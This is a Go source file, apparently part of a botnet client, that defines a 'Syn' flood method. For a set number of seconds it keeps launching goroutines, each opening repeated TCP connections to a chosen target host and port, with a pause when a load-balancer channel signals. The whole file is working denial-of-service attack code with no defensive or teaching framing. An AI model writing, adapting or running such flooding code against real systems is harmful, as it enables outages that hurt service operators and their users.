package methods

import (
	"fmt"
	"homo/client/balancer"
	"net"
	"strconv"
	"strings"
	"time"
)

func Syn(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {

		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:

			go synflood(target, port)
			time.Sleep(200 * time.Millisecond)
			go synflood(target, port)
			go synflood(target, port)
		}
	}
}

func synflood(target string, port string) {

	for i := 0; i < 30; i++ {
		fmt.Println(i)
		conn, err := net.Dial("tcp", target+":"+port)

		if err != nil {
			fmt.Println(err)
			return
		}

		conn.Read([]byte("0"))

	}
}
